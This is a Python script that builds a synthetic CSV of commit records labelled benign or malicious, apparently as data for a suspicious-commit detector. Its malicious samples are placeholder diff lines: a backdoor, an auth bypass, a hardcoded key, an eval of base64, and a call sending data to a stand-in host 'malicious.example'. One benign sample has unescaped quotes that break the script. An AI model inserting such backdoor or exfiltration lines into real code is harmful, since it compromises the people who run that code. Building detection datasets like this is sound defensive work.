import pandas as pd
import random
import uuid
from datetime import datetime, timedelta

def random_diff(kind='benign'):
    # Simple synthetic diff-like string
    if kind == 'benign':
        samples = [
            "+    console.log("fix typo")\n-    // old line",
            "+    added unit tests for foo\n+    refactor logging",
            "+    bump dependency x to 1.2.3",
            "+    adjust UI spacing in header",
            "+    improved input validation for field x"
        ]
    else:
        # malicious-looking diffs: inserting suspicious functions, obfuscated code, credential-like strings
        samples = [
            "+    /* backdoor start */\n+    if (user.isAdmin()) { grantAll(); }",
            "+    // exfiltrate data\n+    sendTo('http://malicious.example/collect', data);",
            "+    // bypass auth check\n+    if (true) { authorize(user); }",
            "+    // suspicious: hardcoded key\n+    API_KEY = 'AKIA' + 'XXXX' + 'SECRET';",
            "+    eval(base64_decode('...'))"
        ]
    return random.choice(samples)

def generate(n=200, out='sample_commits.csv'):
    rows = []
    base_time = datetime.utcnow() - timedelta(days=30)
    devs = ['alice','bob','carol','dave','eve','mallory']
    for i in range(n):
        dev = random.choice(devs)
        # Most commits are benign
        kind = 'benign' if random.random() < 0.95 else 'malicious'
        diff = random_diff(kind)
        files_changed = random.randint(1,5)
        file_paths = ';'.join([random.choice(['/src/app.py','/src/payments.py','/frontend/app.js','/infra/terraform/main.tf','/k8s/deploy.yaml']) for _ in range(files_changed)])
        time = (base_time + timedelta(minutes=random.randint(0,60*24*30))).isoformat()
        commit_id = uuid.uuid4().hex[:8]
        # simple feature: dev role drift (alice normally frontend)
        rows.append({
            'commit_id': commit_id,
            'author': dev,
            'timestamp': time,
            'files_changed': file_paths,
            'diff': diff,
            'label': kind
        })
    df = pd.DataFrame(rows)
    df.to_csv(out, index=False)
    print(f'Wrote {len(df)} rows to {out}')

if __name__ == '__main__':
    generate()
